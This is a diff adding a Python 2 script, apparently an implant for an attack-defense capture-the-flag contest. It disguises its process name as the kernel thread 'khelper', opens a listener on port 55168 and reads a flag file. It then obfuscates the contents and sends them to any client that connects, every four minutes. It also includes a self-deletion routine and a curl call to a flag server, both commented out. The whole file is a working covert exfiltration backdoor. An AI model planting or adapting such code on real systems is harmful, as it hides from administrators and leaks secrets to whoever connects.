@@ -1,0 +1,59 @@
+#!/usr/bin/python
+import time
+import socket
+import os
+import base64
+cmd='curl http://10.10.10.3:8888/getFlag'
+#cmd='curl http://127.0.0.1/getFlag'
+serverAddr=('',55168)
+
+def set_proc_name(newname):
+    from ctypes import cdll, byref, create_string_buffer
+    libc = cdll.LoadLibrary('libc.so.6')
+    buff = create_string_buffer(len(newname)+1)
+    buff.value = newname
+    libc.prctl(15, byref(buff), 0, 0, 0)
+
+def self_remove():
+    filepath=os.path.abspath(sys.argv[0])
+    #print filepath
+    os.remove(filepath)
+
+filename=r'/home/njcms/flag/flag'
+
+def encode(s):
+    s=s[:-7]+chr(ord(s[-7])+1)+s[-6:-5]+chr(ord(s[-5])+1)+s[-4:-3]+chr(ord(s[-3])+1)+s[-2:-1]+chr(ord(s[-1])+1)
+    s=base64.b64encode(s)
+    return s
+
+if __name__=='__main__':
+    #self_remove()
+    global filename
+    set_proc_name('khelper')
+    while True:
+        print "Process wakeup!"
+        try:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            address=('0.0.0.0',55168)
+            s.bind(address)
+            print 'listening on '+address[0]
+            s.listen(5)
+            ss,ip=s.accept()
+            print 'Client '+ip[0]+' is coming'
+            #data=os.popen(cmd).read()
+            data=open(filename).readline().strip()
+            print 'Get data as:'+data
+            data=encode(data)
+            #print 'Encode data as:'+data
+            ss.send(data)
+            print "Sent Datas!Closing now!"
+            print ss.shutdown(socket.SHUT_RDWR)
+            ss.close()
+            print s.shutdown(socket.SHUT_RDWR)
+            s.close()
+            print "Sockets are closed!"
+        except Exception, e:
+            print Exception,":",e
+            #pass
+        print "Process sleeping now!"
+        time.sleep(240)
